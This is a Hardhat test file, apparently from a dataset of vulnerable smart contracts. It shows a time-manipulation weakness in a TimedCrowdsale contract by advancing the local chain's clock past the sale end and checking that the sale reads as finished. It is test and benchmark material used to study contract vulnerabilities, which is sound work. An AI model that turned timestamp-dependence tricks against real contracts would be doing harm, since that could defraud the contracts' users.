const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack time_manipulation/timed_crowdsale.sol', function () {
    async function deployContracts() {
        const TimedCrowdsale = await ethers.getContractFactory('contracts/dataset/time_manipulation/timed_crowdsale.sol:TimedCrowdsale');
        const victim = await TimedCrowdsale.deploy();

    return {victim};
    }

  
    it('exploit time manipulation vulnerability', async function () {
        const {victim} = await loadFixture(deployContracts);

        const saleEndTimestamp = 1546300800;

        // // Fast forward time to January 1, 2019 (just after sale end)
        const timeToIncrease = saleEndTimestamp - (await ethers.provider.getBlock('latest')).timestamp + 1;
        
        await ethers.provider.send("evm_increaseTime", [timeToIncrease]); // increase time past the sale end
        await ethers.provider.send("evm_mine"); // mine a new block

        // // The sale should now be finished due to the time manipulation
        const saleFinished = await victim.isSaleFinished();
        expect(saleFinished).to.be.true;
    });
  });